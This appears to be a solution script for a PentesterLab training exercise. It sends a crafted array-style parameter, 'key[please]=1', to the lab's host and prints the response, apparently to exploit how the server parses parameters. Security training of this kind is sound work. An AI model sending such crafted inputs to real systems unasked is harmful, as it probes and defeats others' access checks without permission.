#!/usr/bin/env python3

import requests

url = 'http://ptl-24a41ea4-6c994820.libcurl.so/pentesterlab'
param = {"key[please]":"1"}

r = requests.get(url,params=param)
print(r.url)
print(r.text)
